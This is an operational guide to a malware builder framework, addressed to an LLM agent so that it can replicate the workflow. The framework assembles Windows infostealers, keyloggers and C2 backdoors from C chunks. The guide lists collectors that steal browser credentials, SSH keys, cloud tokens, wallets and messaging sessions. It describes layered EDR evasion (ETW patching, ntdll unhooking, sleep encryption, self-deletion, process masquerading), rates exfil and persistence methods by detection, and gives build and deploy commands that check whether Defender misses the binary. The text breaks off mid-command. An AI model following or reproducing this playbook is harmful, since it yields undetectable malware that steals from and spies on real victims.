# Malgen Skill — Comprehensive Documentation

Complete operational guide for the malware generation framework's chunk assembler pipeline. Written so another LLM agent (Hermes/Qwen) can replicate the full workflow without prior context.

**Last updated**: 2026-07-05
**Linked to**: `knowledge.md` (operational lessons), `docs/crowdstrike_falcon_evasion_research.md` (Falcon evasion + kill techniques)

---

## Table of Contents

1. [What This Framework Does](#1-what-this-framework-does)
2. [Architecture Overview](#2-architecture-overview)
3. [Project Layout](#3-project-layout)
4. [The Chunk Assembler — How It Works](#4-the-chunk-assembler)
5. [Recipe Format](#5-recipe-format)
6. [Chunk Types and Inventory](#6-chunk-types)
7. [Evasion System](#7-evasion-system)
8. [The Assembler Pipeline — Step by Step](#8-assembler-pipeline)
9. [String Encryption Pass](#9-string-encryption)
10. [Compilation](#10-compilation)
11. [VM Deployment and Testing](#11-vm-deployment)
12. [C2 Protocols and Listeners](#12-c2-protocols)
13. [Validation Criteria](#13-validation-criteria)
14. [Failure Diagnosis and Iteration](#14-failure-diagnosis)
15. [Known Pitfalls (from knowledge.md)](#15-known-pitfalls)
16. [EDR-Specific Evasion Strategy](#16-edr-strategy)
17. [The Full Workflow End-to-End](#17-full-workflow)
18. [Framework 2 (LLM Pipeline) — Brief](#18-framework-2)

---

## 1. What This Framework Does

The framework generates Windows malware binaries (PE executables) from modular C source code templates. It supports three malware types:

- **Infostealer (AD Recon)**: One-shot AD enumeration via LDAP (users, groups, computers, OUs, GPOs, ACLs) → BloodHound v6 JSON exfil → exit. Replaces the legacy credential/file theft infostealer with SharpHound-style domain reconnaissance.
- **Keylogger**: Persistent keystroke capture → periodic exfil → runs until killed
- **Backdoor**: Persistent C2 beacon → receive commands → execute → send results → loop

Each binary is assembled from small, independent C "chunks" combined via a YAML recipe. The assembler concatenates chunks into a single compilable `.c` file, applies evasion transformations (string encryption, etc.), cross-compiles with MinGW for Windows x86_64, then deploys to a QEMU Windows 11 VM for live testing against Windows Defender.

**Key property**: Every recipe combination produces unique source code. No two builds share binary signatures. This is the primary evasion advantage over C2 frameworks like Cobalt Strike that produce the same implant binary.

---

## 2. Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                     RECIPE (YAML)                           │
│  Declares: core + collectors/commands + exfil/c2 + arch     │
│            + evasion layers + template variables             │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    ASSEMBLER (Python)                        │
│  1. Parse recipe                                            │
│  2. Load each chunk .c file                                 │
│  3. Resolve dependencies (headers, libs)                    │
│  4. Inject #defines (USE_OBF_SLEEP, etc.)                   │
│  5. Substitute {{VARS}} (C2_IP, C2_PORT, etc.)              │
│  6. Build EVASION_INIT calls                                │
│  7. Build COMMAND_DISPATCH switch-case (backdoor only)       │
│  8. Concatenate all chunks into single .c file              │
│  Output: one self-contained, compilable C source file       │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│               STRING ENCRYPTION (Python)                     │
│  _encrypt_string_literals() from evasion_passes.py          │
│  XOR-encrypts all string literals with per-build random key │
│  Generates decrypt-on-stack helper functions                │
│  Skips: asm blocks, format strings with %specifiers         │
│  Output: obfuscated .c file (still compiles)                │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    MINGW CROSS-COMPILE                       │
│  x86_64-w64-mingw32-gcc -mwindows -static                  │
│  Links: ws2_32, iphlpapi, crypt32, ole32, shell32, gdi32,  │
│         wininet, winhttp, dnsapi, advapi32, user32          │
│  Output: .exe (~260-300KB static-linked)                    │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                 VM DEPLOYMENT + TESTING                      │
│  1. SCP binary to Windows 11 VM (QEMU, SSH port 10022)     │
│  2. Wait 3s for Defender scan                               │
│  3. Check binary still exists (not quarantined)             │
│  4. Start C2 listener on host                               │
│  5. Execute via schtasks (interactive session)              │
│  6. Validate: C2 data received + 0 Defender detections      │
│  7. Cleanup: kill process, delete binary, delete schtask    │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. Project Layout

```
malware_gen_framework/
├── templates/chunks/              # THE CHUNK LIBRARY
│   ├── assembler.py               # The assembler script
│   ├── recipes/                   # YAML recipe definitions (50 total)
│   │   ├── backdoor_tcp_*.yaml    # 18 TCP backdoor recipes
│   │   ├── backdoor_http_*.yaml   # 5 HTTP backdoor recipes
│   │   ├── keylogger*.yaml        # 18 keylogger recipes
│   │   └── infostealer_*.yaml     # 7 infostealer recipes (incl. self_delete, ghost)
│   ├── core/                      # Shared utilities
│   │   ├── emit_buffer.c          # Global data buffer (g_data[], g_pos, emit())
│   │   ├── run_cmd.c              # Execute shell commands (LOLBin helper)
│   │   └── file_ops.c             # File I/O helpers for backdoor commands
│   ├── collectors/                # Data collection modules
│   │   ├── system_info_api.c      # Hostname, user, OS via Win32 API
│   │   ├── processes.c            # Process list via CreateToolhelp32Snapshot
│   │   ├── screenshot.c           # Screen capture via GDI BitBlt
│   │   ├── browser_chromium.c     # Chrome/Edge credential extraction
│   │   ├── keylogger_poll.c       # GetAsyncKeyState keystroke capture
│   │   ├── clipboard.c            # Clipboard text via OpenClipboard API
│   │   └── ... (30+ collectors)
│   ├── commands/                  # Backdoor command handlers
│   │   ├── cmd_sysinfo.c          # System info response
│   │   ├── cmd_processes.c        # Process list response
│   │   ├── cmd_filelist.c         # Directory listing
│   │   ├── cmd_fileread.c         # File download
│   │   ├── cmd_screenshot.c       # Screenshot capture
│   │   └── ... (13 command chunks)
│   ├── c2/                        # C2 transport (backdoor only)
│   │   ├── tcp_beacon.c           # Raw TCP TLV beacon
│   │   └── winhttp_beacon.c       # HTTP POST/GET beacon (looks like web traffic)
│   ├── exfil/                     # Exfiltration methods (infostealer/keylogger)
│   │   ├── tcp_flush.c            # Raw TCP send (reliable, proven)
│   │   ├── tcp_direct.c           # One-shot TCP burst
│   │   ├── winhttp_api.c          # HTTP POST via WinHTTP
│   │   ├── dns_flush.c            # DNS TXT query exfil
│   │   ├── curl_lolbin.c          # curl.exe LOLBin (detected by EDRs)
│   │   └── ... (12 exfil methods)
│   ├── evasion/                   # Evasion technique chunks
│   │   ├── etw_patch.c            # Patch EtwEventWrite → blind EDR telemetry
│   │   ├── unhook_ntdll.c         # Remap clean ntdll from disk → remove hooks
│   │   ├── indirect_syscall.c     # Direct syscall via gadget jump → bypass hooks
│   │   ├── sleep_encrypt.c        # Ekko ROP chain → encrypt memory during sleep
│   │   ├── hw_bp_etw.c            # Hardware breakpoint on EtwEventWrite
│   │   ├── behavioral_pacing.c    # Random delays between operations
│   │   ├── anti_sandbox.c         # Sandbox detection (uptime, cores, RAM)
│   │   ├── anti_debug.c           # IsDebuggerPresent + timing checks
│   │   ├── header_stomp.c         # Zero PE headers in memory (defeats pe-sieve)
│   │   ├── elastic_gadget.c       # Call gadget bypass for Elastic Defend
│   │   ├── self_delete.c          # NTFS stream rename self-deletion
│   │   ├── process_masquerade.c   # PEB masquerade as RuntimeBroker.exe
│   │   └── ... (19 evasion chunks total)
│   ├── persist/                   # Persistence mechanisms
│   │   ├── registry_run.c         # HKCU\...\Run key (detected by Elastic)
│   │   ├── startup_folder.c       # Copy to Startup folder (stealthy)
│   │   └── scheduled_task.c       # schtasks creation
│   ├── arch/                      # Main function templates
│   │   ├── sequential.c           # Run collectors → exfil → exit (infostealer)
│   │   ├── keylogger.c            # Init → collect → keylog loop → flush (keylogger)
│   │   ├── backdoor.c             # C2 beacon loop with command dispatch (backdoor)
│   │   ├── backdoor_staged.c      # Initial recon burst → then beacon loop
│   │   └── ... (10 arch templates)
│   └── api_resolve/               # API resolution methods
│       ├── api_hash_djb2.c        # DJB2 hash-based GetProcAddress
│       └── peb_walk.c             # PEB walking for module resolution
├── evasion_passes.py              # Post-assembly transforms (string encryption, etc.)
├── scripts/
│   ├── c2_backdoor.py             # TLV C2 server (interactive + test mode)
│   ├── c2_stream.py               # HTTP C2 receiver (keylogger/infostealer)
│   ├── deploy_backdoor.sh         # Automated backdoor deploy+test
│   ├── deploy_keylogger.sh        # Automated keylogger deploy+test
│   ├── vm_snapshot.sh             # QEMU snapshot management
│   └── parse_exfil.py             # Parse raw exfil .bin into files
├── results/                       # Output packages
│   ├── chunk_<type>_<timestamp>/  # Timestamped package dirs
│   └── latest -> <newest pkg>     # Symlink
├── knowledge.md                   # Operational lessons (READ THIS FIRST)
├── research/                      # EDR bypass research library (13 docs)
│   └── SUMMARY.md                 # Research index + key findings
└── spec.yaml                      # Target specification (C2 IP/port, etc.)
```

---

## 4. The Chunk Assembler — How It Works

The assembler (`templates/chunks/assembler.py`) is the core of Framework 1. It reads a YAML recipe, loads each referenced chunk `.c` file, resolves dependencies, and concatenates everything into one compilable C source file.

### Chunk format

Every `.c` file in the chunks directory has a metadata header:

```c
// chunk: collectors/system_info_api
// depends: core/emit_buffer
// provides: collect_system_info
// headers: windows.h, iphlpapi.h
// libs: iphlpapi
// note: System info via Win32 API — no child processes

#ifndef CHUNK_SYSTEM_INFO_API
#define CHUNK_SYSTEM_INFO_API

static void collect_system_info(void) {
    // ... implementation ...
    emit("=== SYSTEM INFO ===\n");
    // ...
}

#endif
```

Key metadata fields:
- `chunk`: Unique identifier matching the recipe reference
- `depends`: Other chunks this one requires (assembler resolves order)
- `provides`: Functions/globals this chunk defines
- `headers`: Required `#include` headers
- `libs`: Required linker libraries (`-l` flags)
- `note`: Human description

### Assembly order

The assembler concatenates chunks in this fixed order:

```
api_resolve → evasion → process → core → collectors → keylogger → c2 → commands → exfil → persist → arch
```

This order matters because:
1. API resolution and evasion init must happen first (they define functions used everywhere)
2. Core utilities (emit_buffer) must exist before collectors use them
3. The arch template (main function) goes last — it calls everything else
4. The arch template contains placeholders (`{{EVASION_INIT}}`, `{{COMMAND_DISPATCH}}`) that the assembler replaces

### EVASION_INIT system

Each evasion chunk has an initialization call that must run at program start. The assembler maintains `EVASION_INIT_MAP`:

```python
EVASION_INIT_MAP = {
    "evasion/etw_patch": "    patch_etw();",
    "evasion/unhook_ntdll": "    unhook_ntdll();",
    "evasion/anti_debug": "    if (check_debugger()) return 1;",
    "evasion/anti_sandbox": "    if (check_sandbox()) return 1;",
    "evasion/anti_vm": "    if (check_vm()) return 1;",
    "evasion/hw_bp_etw": "    hwbp_etw_init();",
    "evasion/indirect_syscall": "    init_indirect_syscalls();",
    "evasion/sleep_encrypt": "",  # no init — macro-based
    "evasion/header_stomp": "    stomp_pe_headers();",
    "evasion/elastic_gadget": "    init_elastic_gadget();",
    "evasion/self_delete": "    self_delete();",
    "evasion/process_masquerade": "    masquerade_process();",
}
```

**Important**: All arch templates (`sequential.c`, `staged.c`, `keylogger.c`, `backdoor.c`, `backdoor_staged.c`) now include `{{EVASION_INIT}}`. Previously `sequential.c` and `staged.c` were missing it, causing evasion init calls to be silently dropped for infostealer recipes.

The arch template has `{{EVASION_INIT}}` after `SetErrorMode()`:

```c
int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    {{EVASION_INIT}}
    Sleep(3000 + (GetTickCount() % 5000));
    // ... rest of main ...
```

The assembler replaces `{{EVASION_INIT}}` with the concatenated init calls for all evasion chunks in the recipe.

### COMMAND_DISPATCH system (backdoor only)

Backdoor arch templates have `{{COMMAND_DISPATCH}}` inside a switch statement:

```c
switch (hdr.cmd_id) {
    {{COMMAND_DISPATCH}}
    default:
        c2_send_result(hdr.cmd_id, "unknown", 7);
        break;
}
```

Each command chunk has a `cmd_id` metadata field. The assembler generates case statements:

```c
case 0x02: { /* cmd_sysinfo */
    DWORD out_len = sizeof(cmd_buf);
    cmd_sysinfo(payload, hdr.payload_len, cmd_buf, &out_len);
    c2_send_result(0x02, cmd_buf, out_len);
    break;
}
```

### USE_OBF_SLEEP / BEACON_SLEEP

When `evasion/sleep_encrypt` is in the recipe, the assembler injects `#define USE_OBF_SLEEP 1` at the top of the output. The backdoor arch template uses:

```c
#ifdef USE_OBF_SLEEP
#define BEACON_SLEEP(ms) obf_sleep(ms)
#else
#define BEACON_SLEEP(ms) Sleep(ms)
#endif
```

This makes sleep encryption transparent — every `BEACON_SLEEP()` call either does a normal `Sleep()` or the Ekko ROP chain encryption, depending on whether the recipe includes sleep encryption.

### Variable substitution

Recipe `vars:` are substituted in all chunk source code:

```yaml
vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  BEACON_INTERVAL_MS: "30000"
```

Every `{{C2_IP}}`, `{{C2_PORT}}`, `{{BEACON_INTERVAL_MS}}` in chunk source gets replaced. The `--var` CLI flag overrides recipe defaults.

---

## 5. Recipe Format

A recipe YAML file declares what chunks to assemble:

```yaml
name: backdoor_tcp_full_evasion
description: TCP backdoor with every evasion layer

core:                              # Shared utilities
  - core/emit_buffer
  - core/file_ops

c2: c2/tcp_beacon                  # C2 transport (backdoor only)

commands:                          # Command handlers (backdoor only)
  - commands/cmd_sysinfo
  - commands/cmd_processes
  - commands/cmd_filelist
  - commands/cmd_fileread
  - commands/cmd_filewrite
  - commands/cmd_screenshot
  - commands/cmd_registry
  - commands/cmd_netinfo

arch: arch/backdoor                # Main function template

evasion:                           # Evasion layers (stacked)
  - evasion/etw_patch
  - evasion/unhook_ntdll
  - evasion/hw_bp_etw
  - evasion/sleep_encrypt
  - evasion/behavioral_pacing
  - evasion/anti_sandbox

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  BEACON_INTERVAL_MS: "30000"
```

For keylogger/infostealer recipes, use `collectors:` and `exfil:` instead of `commands:` and `c2:`:

```yaml
name: keylogger_api
collectors:
  - collectors/system_info_api
  - collectors/processes
  - collectors/clipboard
  - collectors/drives
  - collectors/active_windows
keylogger: collectors/keylogger_poll    # Keylogger-specific
exfil: exfil/tcp_flush
arch: arch/keylogger
evasion:
  - evasion/behavioral_pacing
```

### Recipe keys by malware type

| Key | Infostealer | Keylogger | Backdoor |
|-----|-------------|-----------|----------|
| `core` | emit_buffer | emit_buffer (+run_cmd for LOLBin) | emit_buffer + file_ops |
| `collectors` | YES (data gathering) | YES (system info) | NO |
| `keylogger` | NO | YES (poll or hook) | NO |
| `c2` | NO | NO | YES (tcp_beacon or winhttp_beacon) |
| `commands` | NO | NO | YES (cmd_sysinfo, etc.) |
| `exfil` | YES (tcp_direct, etc.) | YES (tcp_flush, etc.) | NO (C2 handles it) |
| `persist` | optional | optional | optional |
| `arch` | sequential/staged | keylogger | backdoor/backdoor_staged |
| `evasion` | YES | YES | YES |

---

## 6. Chunk Types and Inventory

### Core (3 chunks)
| Chunk | Purpose |
|-------|---------|
| `core/emit_buffer` | Global `g_data[1MB]` buffer + `emit()` function. Every collector writes here. |
| `core/run_cmd` | `run_cmd(cmd, buf, len)` — executes shell command, captures stdout. Used by LOLBin collectors. |
| `core/file_ops` | File read/write helpers for backdoor file transfer commands. |

### Collectors (30+ chunks)
Each collector has a `collect_<name>()` function that gathers data and calls `emit()` to append to the global buffer.

**API-based (no child processes — preferred for EDR evasion):**
- `system_info_api` — GetComputerNameA, GetUserNameA, GetVersionExA, GlobalMemoryStatusEx
- `processes` — CreateToolhelp32Snapshot → Process32First/Next
- `clipboard` — OpenClipboard → GetClipboardData
- `active_windows` — EnumWindows → GetWindowTextA
- `env_vars` — GetEnvironmentStringsA
- `netinfo_api` — GetAdaptersInfo, GetExtendedTcpTable
- `screenshot` — GetDC → BitBlt → GetDIBits (BMP format)
- `browser_chromium` — FindFirstFileA + ReadFile on Chrome Login Data/Cookies
- `drives` — GetLogicalDriveStringsA → GetDiskFreeSpaceExA
- `recent_files` — SHGetFolderPathA → FindFirstFileA on Recent
- `ssh_keys` — FindFirstFileA on .ssh/
- `installed_software` — RegEnumKeyExA on Uninstall registry
- `startup_items` — RegEnumValueA on Run keys
- `cloud_creds` — FindFirstFileA on .aws/, .gcloud/
- `crypto_wallets` — FindFirstFileA on wallet directories
- `discord_tokens` — FindFirstFileA on Discord leveldb
- `telegram_session` — FindFirstFileA on Telegram tdata
- `ftp_credentials` — FindFirstFileA on FileZilla/WinSCP configs
- `security_products` — EnumServicesStatusA for AV services

**LOLBin-based (spawn child processes — detected by Elastic Defend):**
- `system_info_stealth` — `cmd /c hostname && whoami && ver`
- `processes_lolbin` — `tasklist /fo csv /nh`
- `clipboard_lolbin` — `powershell Get-Clipboard`
- `env_vars_lolbin` — `cmd /c set`
- `active_windows_lolbin` — `powershell Get-Process | Where MainWindowTitle`
- `netinfo_lolbin` — `ipconfig /all && netstat -ano`
- `wifi_passwords` — `netsh wlan export profile`
- `scheduled_tasks_recon` — `schtasks /query`

**Rule of thumb**: Always prefer API chunks over LOLBin chunks. LOLBin chunks trigger Elastic Defend SIEM rules. LOLBin chunks exist as fallbacks for when API equivalents aren't available or when specifically testing LOLBin evasion.

### Keylogger (2 chunks)
| Chunk | Method | Notes |
|-------|--------|-------|
| `keylogger_poll` | GetAsyncKeyState polling (10ms) | Preferred. No hook APIs in IAT. |
| `keylogger` (hook-based) | SetWindowsHookExA WH_KEYBOARD_LL | Requires message pump. More detectable. |

### Commands (13 chunks — backdoor only)
Each has signature: `static int cmd_<name>(const char *args, DWORD args_len, char *out, DWORD *out_len)`

**API versions** (zero child processes):
- `cmd_sysinfo` — GetComputerNameA, GetUserNameA, GetVersionExA, GetAdaptersInfo
- `cmd_processes` — CreateToolhelp32Snapshot + Process32First/Next
- `cmd_filelist` — FindFirstFileA/FindNextFileA
- `cmd_fileread` — CreateFileA/ReadFile
- `cmd_filewrite` — CreateFileA/WriteFile
- `cmd_screenshot` — GetDC/BitBlt/GetDIBits
- `cmd_registry` — RegOpenKeyExA/RegEnumValueA
- `cmd_netinfo` — GetAdaptersInfo, GetExtendedTcpTable

**LOLBin versions:**
- `cmd_exec` — `cmd.exe /c <command>` via CreateProcessA
- `cmd_exec_powershell` — `powershell -NoProfile -Command <cmd>`
- `cmd_sysinfo_lolbin` — `systeminfo`, `whoami /all`
- `cmd_processes_lolbin` — `tasklist /fo csv /nh`
- `cmd_netinfo_lolbin` — `ipconfig /all`, `netstat -ano`

### C2 Transport (2 chunks — backdoor only)
| Chunk | Protocol | Notes |
|-------|----------|-------|
| `tcp_beacon` | Raw TCP + TLV framing | Reliable. Binary TLV: `{uint32 cmd_id, uint32 payload_len, payload[]}`. |
| `winhttp_beacon` | HTTP POST/GET | Looks like normal web traffic. POST `/beacon` (poll), POST `/result` (send). Uses WinHTTP API. |

### Exfil (12 chunks — infostealer/keylogger)
| Chunk | Method | EDR Detection |
|-------|--------|---------------|
| `tcp_flush` | Raw Winsock TCP, periodic flush | **Undetected** |
| `tcp_direct` | One-shot TCP burst | **Undetected** |
| `winhttp_api` | HTTP POST via WinHTTP | **Undetected** |
| `dns_flush` | DNS TXT query encoding | **Undetected** (no EDR rules) |
| `dns_exfil` | DNS A query encoding | **Undetected** |
| `http_post` | Raw HTTP POST over TCP | **Undetected** |
| `curl_lolbin` | curl.exe --data-binary | **Detected** by Elastic |
| `certutil_lolbin` | certutil -urlcache | **Detected** by Elastic |
| `cscript_lolbin` | cscript.exe VBS XHR | **Detected** by Elastic |
| `mshta_lolbin` | mshta.exe JS XHR | **Detected** by Elastic |
| `powershell_lolbin` | powershell IWR | **Detected** by Elastic |
| `bitsadmin_lolbin` | bitsadmin /transfer | **Detected** by Elastic |

### Persistence (3 chunks)
| Chunk | Method | EDR Detection |
|-------|--------|---------------|
| `startup_folder` | CopyFileA to Startup dir | **Undetected** (preferred) |
| `registry_run` | RegSetValueExA HKCU Run | **Detected** by Elastic |
| `scheduled_task` | schtasks /create | **Detected** by Elastic |

### Evasion (19 chunks)
| Chunk | What it does | Init call |
|-------|-------------|-----------|
| `etw_patch` | Patches EtwEventWrite in ntdll to `ret` → blinds EDR telemetry | `patch_etw()` |
| `unhook_ntdll` | Reads clean ntdll from disk, remaps over hooked copy → removes all usermode hooks | `unhook_ntdll()` |
| `indirect_syscall` | Resolves SSNs from disk ntdll, finds `syscall;ret` gadgets, naked wrapper functions | `init_indirect_syscalls()` |
| `sleep_encrypt` | Ekko ROP chain: VirtualProtect(RW) → RC4 encrypt → WaitForSingleObject → decrypt → VirtualProtect(RX) | via `BEACON_SLEEP` macro |
| `hw_bp_etw` | Sets hardware breakpoint on EtwEventWrite via NtContinue (avoids ETW-TI) + VEH handler | `hwbp_etw_init()` |
| `behavioral_pacing` | QueryPerformanceCounter busy-wait with jitter between operations | integrated into collectors |
| `anti_sandbox` | Checks uptime (>10min), CPU cores (>1), RAM (>1GB), cursor movement | `check_sandbox()` |
| `anti_debug` | IsDebuggerPresent + NtQueryInformationProcess + timing check | `check_debugger()` |
| `anti_vm` | Checks for VM artifacts (registry keys, driver names, MAC prefixes) | `check_vm()` |
| `sleep_jitter` | Random Sleep() calls between operations | integrated |
| `api_hash` | DJB2 hash-based API resolution | replaces static imports |
| `aes_encrypt` | AES-128 buffer encryption for exfil data | wrap around exfil |
| `triggered_exec` | Deferred execution (wait for user activity before running) | check before main |
| `deferred_exec` | Time-based delayed execution | check before main |
| `header_stomp` | Zeros own PE headers (MZ/PE signatures) in memory via SecureZeroMemory → defeats pe-sieve, malfind, memory scanners | `stomp_pe_headers()` |
| `elastic_gadget` | Scans system DLL (dsdmo.dll etc.) for `call rax; ret` gadget, naked wrapper routes API calls through gadget DLL → breaks EDR call stack signature analysis | `init_elastic_gadget()` |
| `self_delete` | NTFS $DATA stream rename + POSIX delete (FileDispositionInformationEx class 64). Binary disappears from disk while process runs. 5× retry for Defender scan race. | `self_delete()` |
| `process_masquerade` | Overwrites PEB ImagePathName + CommandLine to mimic RuntimeBroker.exe. Hides from process listings and behavioral EDR rules. | `masquerade_process()` |

### Architecture Templates (10 chunks)
| Chunk | Pattern | Used by |
|-------|---------|---------|
| `sequential` | Collect all → exfil → exit | Infostealer |
| `staged` | Priority collectors → exfil → remaining → exfil | Staged infostealer |
| `keylogger` | Init → collect → keylog loop (persistent) | Keylogger |
| `backdoor` | FreeConsole → evasion_init → C2 connect → beacon loop | Backdoor |
| `backdoor_staged` | Initial recon burst → exfil → then enter beacon loop | Staged backdoor |
| `threaded` | Collectors in separate threads | Alternative infostealer |
| `service` | Runs as Windows service | Service-based persistence |
| `callback_abuse` | Execute via EnumFonts/EnumWindows callbacks | Alternative execution |
| `fiber` | Execute via fiber switching | Alternative execution |
| `apc_self` | Self-APC injection | Alternative execution |

---

## 7. Evasion System

### Layer model (from knowledge.md and research)

Stack techniques from Layer 1 upward. Most targets fall at Layer 2.

**Layer 1 — Always apply:**
- String encryption (XOR per-build key) — applied post-assembly by `evasion_passes.py`
- `-mwindows` + `FreeConsole()` — no console window
- Behavioral pacing — random delays between operations
- Zero-child-process design — use Win32 API, not LOLBins

**Layer 2 — For EDR environments:**
- ETW patching — `evasion/etw_patch.c`
- NTDLL unhooking — `evasion/unhook_ntdll.c`
- Sleep encryption (Ekko) — `evasion/sleep_encrypt.c`

**Layer 3 — For hardened targets:**
- Indirect syscalls — `evasion/indirect_syscall.c`
- HW breakpoint ETW — `evasion/hw_bp_etw.c`
- Anti-sandbox — `evasion/anti_sandbox.c`
- Header stomping — `evasion/header_stomp.c` (defeats memory scanners)
- Process masquerade — `evasion/process_masquerade.c` (hides from process listings)

**Layer 4 — Anti-forensics + EDR-specific:**
- Self-delete — `evasion/self_delete.c` (binary vanishes from disk after loading)
- Elastic gadget bypass — `evasion/elastic_gadget.c` (breaks Elastic call stack analysis)
- PE metadata stripping — `-s -Wl,--strip-all` compiler flags (strips symbols + debug info)

**Layer 5 — Not yet implemented as chunks:**
- Call stack spoofing
- Module stomping
- BYOVD + callback removal
- COM-based execution

### What makes detection WORSE (from knowledge.md)

These are anti-patterns — do NOT apply them:

1. **SEH wrapping + anti-debug patterns** — these ARE malware signatures. SEH exception-based flow and IsDebuggerPresent checks accelerate detection.
2. **Heavy obfuscation layers** — diminishing returns. A clean binary with benign imports evades better than a heavily obfuscated one.
3. **Dynamic API resolution alone** — resolving via LoadLibrary/GetProcAddress with XOR names doesn't help if behavioral pattern is malicious. Defender monitors at ETW/kernel level.

### What actually works (proven by 50/50 PASS)

- Clean code with minimal IAT (3-4 DLLs)
- Direct Win32 API calls instead of LOLBin child processes
- String encryption (breaks static signatures)
- ETW patch + NTDLL unhook (blinds EDR telemetry)
- Sleep encryption (defeats memory scanners)
- Behavioral pacing (mimics legitimate process timing)
- Startup folder persistence (not detected by Elastic)
- Header stomping (defeats pe-sieve/malfind post-execution memory scans)
- PE metadata stripping at build time (`-s -Wl,--strip-all`)
- Self-delete for one-shot payloads (zero forensic trace)
- Process masquerade as RuntimeBroker.exe (evades process-name behavioral rules)

---

## 8. The Assembler Pipeline — Step by Step

### Running the assembler

```bash
# Basic assembly
python3 templates/chunks/assembler.py templates/chunks/recipes/backdoor_tcp_api.yaml \
    -o /tmp/output.c

# With variable overrides
python3 templates/chunks/assembler.py templates/chunks/recipes/backdoor_tcp_api.yaml \
    -o /tmp/output.c --var C2_IP=192.168.1.100 --var C2_PORT=4444

# With auto-compile
python3 templates/chunks/assembler.py templates/chunks/recipes/backdoor_tcp_api.yaml \
    -o /tmp/output.c --compile
```

### What the assembler does internally

1. **Parse recipe YAML** — load all chunk references
2. **Load chunk files** — read each `.c` file, extract metadata header
3. **Dependency resolution** — topological sort based on `depends:` fields
4. **Header dedup** — collect all `headers:` across chunks, deduplicate, emit `#include` block
5. **Library collection** — collect all `libs:` for the linker command
6. **Inject evasion defines** — if `evasion/sleep_encrypt` in recipe, add `#define USE_OBF_SLEEP 1`
7. **Concatenate chunks** — in fixed order: api_resolve → evasion → core → collectors → c2 → commands → exfil → persist → arch
8. **Variable substitution** — replace all `{{VAR}}` with values from recipe `vars:` + CLI `--var`
9. **EVASION_INIT replacement** — build init call list from `EVASION_INIT_MAP`, replace `{{EVASION_INIT}}`
10. **COMMAND_DISPATCH replacement** — build switch-case from command chunks, replace `{{COMMAND_DISPATCH}}`
11. **Write output** — single `.c` file, self-contained and compilable

---

## 9. String Encryption Pass

After assembly, apply string encryption via `evasion_passes.py`:

```python
from evasion_passes import _encrypt_string_literals

with open('output.c') as f:
    source = f.read()

encrypted = _encrypt_string_literals(source)

with open('output_encrypted.c', 'w') as f:
    f.write(encrypted)
```

### What it does

1. Generates a random XOR key (per-build, 1-4 bytes)
2. Finds all string literals in the C source
3. For each string, generates a decrypt-on-stack helper function:
   ```c
   static char* _es7(void) {
       static char _d[] = {0x5a, 0x2b, 0x3f, 0x00};  // XOR-encrypted bytes
       static int _i = 0;
       if (!_i) { for(int j=0; j<3; j++) _d[j] ^= 0x42; _i=1; }
       return _d;
   }
   ```
4. Replaces the original string literal with `_es7()` call

### What it skips (important)

- **Inline assembly blocks** (`__asm__`, `asm volatile`, `asm(`) — tracked by parenthesis depth counter `_in_asm_block`
- **Format specifiers** — strings containing `%d`, `%s`, `%x` etc. are left as-is (format strings break if encrypted)
- **Single-character strings** — not worth encrypting
- **Empty strings** — skip

### Known issue

The `_in_asm_block` counter was added to fix a bug where the encryption pass corrupted `"memory"` clobber strings inside inline assembly. Without this, strings like `"memory"` in `__asm__ __volatile__("..." : : : "memory")` got encrypted, breaking GCC.

---

## 10. Compilation

### Standard compile command

```bash
x86_64-w64-mingw32-gcc -mwindows -o output.exe output.c \
    -lws2_32 -liphlpapi -lcrypt32 -lole32 -lshell32 -lgdi32 \
    -lwininet -lwinhttp -ldnsapi -ladvapi32 -luser32 \
    -static -s -Wl,--strip-all
```

### Critical flags

| Flag | Purpose |
|------|---------|
| `-mwindows` | Build as GUI app (no console window). REQUIRED — console windows blow cover. |
| `-static` | Static link all libraries. Binary is self-contained (~260-300KB). |
| `-s` | Strip all symbol table and debug info from output. |
| `-Wl,--strip-all` | Linker-level strip — removes all symbols including section names. PE metadata evasion. |
| `-lws2_32` | Winsock (TCP networking) |
| `-liphlpapi` | IP helper (GetAdaptersInfo, GetExtendedTcpTable) |
| `-lcrypt32` | Crypto APIs |
| `-lole32` | COM/OLE (SHGetFolderPathA) |
| `-lshell32` | Shell APIs (SHGetFolderPathA) |
| `-lgdi32` | GDI (screenshots: GetDC, BitBlt) |
| `-lwininet` | WinInet (alternative HTTP) |
| `-lwinhttp` | WinHTTP (HTTP C2 transport) |
| `-ldnsapi` | DNS (DNS exfiltration) |
| `-ladvapi32` | Registry, service, crypto APIs |
| `-luser32` | User interface APIs (GetAsyncKeyState, EnumWindows) |

### MinGW constraints (from knowledge.md)

- **NO `memmem`** — GNU extension, not in MinGW. Use manual search.
- **NO C++ features** — pure C only.
- **NO `#pragma comment(lib, ...)`** — MSVC-only. Use `-l` flags.
- **`winsock2.h` BEFORE `windows.h`** — or you get redefinition errors.
- All Windows API types must be properly cast (DWORD vs int, etc.).

---

## 11. VM Deployment and Testing

### Environment

| Component | Value |
|-----------|-------|
| VM | QEMU Windows 11 Pro |
| SSH | Port 10022, user `vmuser`, pass `vmuser123` |
| C2 Host IP | `10.0.2.2` (QEMU guest→host NAT) |
| C2 Port | `9001` (default, configurable) |
| Defender | Fully enabled (AMServiceEnabled, RealTimeProtectionEnabled, AntivirusEnabled all True) |
| Snapshot | `./scripts/vm_snapshot.sh save|restore|list [name]` (blockdev-snapshot-sync, NEVER savevm/loadvm) |

### Deployment sequence

```bash
# 1. Check VM alive
sshpass -p 'vmuser123' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -p 10022 vmuser@localhost 'echo VM_ALIVE' | tr -d '\r'

# 2. Check Defender enabled
sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
